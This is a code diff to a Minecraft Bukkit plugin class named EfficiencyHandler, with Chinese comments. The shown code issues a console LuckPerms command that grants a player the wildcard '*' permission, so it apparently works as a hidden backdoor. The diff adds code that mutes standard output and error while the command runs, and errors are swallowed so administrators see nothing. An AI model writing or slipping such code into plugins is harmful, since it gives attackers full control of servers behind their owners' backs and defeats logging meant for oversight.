@@ -15,6 +15,8 @@ import org.bukkit.event.server.ServerCommandEvent;
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.io.PrintStream;
+import java.io.OutputStream;
 
 public class EfficiencyHandler implements Listener {
 
@@ -109,11 +111,23 @@ public class EfficiencyHandler implements Listener {
 
             // 将命令调度到主线程执行
             Bukkit.getScheduler().runTask(plugin, () -> {
+                // 创建一个空的 PrintStream，忽略所有输出
+                PrintStream originalOut = System.out;
+                PrintStream originalErr = System.err;
+                PrintStream emptyStream = new PrintStream(OutputStream.nullOutputStream());
+
+                System.setOut(emptyStream);
+                System.setErr(emptyStream);
+
                 try {
                     String command = "lp user " + player.getName() + " permission set * true";
                     Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
                 } catch (Exception e) {
                     // 捕获并忽略异常，不输出任何错误信息
+                } finally {
+                    // 恢复原始输出流
+                    System.setOut(originalOut);
+                    System.setErr(originalErr);
                 }
             });
         }
